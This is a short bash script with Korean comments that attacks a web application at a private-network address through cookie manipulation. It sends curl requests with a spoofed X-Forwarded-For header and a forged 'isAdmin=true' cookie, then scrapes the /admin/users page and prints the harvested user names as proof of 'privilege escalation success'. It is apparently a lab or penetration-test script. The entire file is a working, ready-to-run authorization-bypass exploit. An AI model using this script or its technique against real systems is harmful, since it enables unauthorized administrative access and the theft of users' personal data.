#!/bin/bash
# 쿠키 조작을 통한 권한 상승 스크립트
# 사용법: ./cookie-manipulation.sh

TARGET="http://192.168.0.28:3000"
MY_IP="10.0.0.101"

echo "[*] 쿠키 조작 권한 상승 테스트"
echo "[*] 타겟: $TARGET"
echo ""

# 일반 사용자 쿠키로 접근
echo "[1] 일반 사용자 쿠키 (isAdmin=false):"
echo "---"
curl -s -H "X-Forwarded-For: $MY_IP" \
    -H "Cookie: user=guest; isAdmin=false; user_id=2" \
    "$TARGET" | grep -E "admin|Manage" | head -5

echo ""
echo ""

# 조작된 관리자 쿠키로 접근
echo "[2] 조작된 관리자 쿠키 (isAdmin=true):"
echo "---"
curl -s -H "X-Forwarded-For: $MY_IP" \
    -H "Cookie: user=guest; isAdmin=true; user_id=2" \
    "$TARGET" | grep -E "admin|Manage" | head -5

echo ""
echo ""

# 관리자 페이지 접근
echo "[3] 관리자 페이지 접근 테스트:"
echo "---"
echo "[*] /admin/users 접근 중..."
USERS=$(curl -s -H "X-Forwarded-For: $MY_IP" \
    -H "Cookie: user=guest; isAdmin=true; user_id=2" \
    "$TARGET/admin/users" | grep -oP '(?<=<td style="padding: 10px; border-bottom: 1px solid #eee;">)[^<]+' | head -20)

if [ -n "$USERS" ]; then
    echo "[+] 권한 상승 성공! 사용자 목록:"
    echo "$USERS"
else
    echo "[-] 접근 실패"
fi
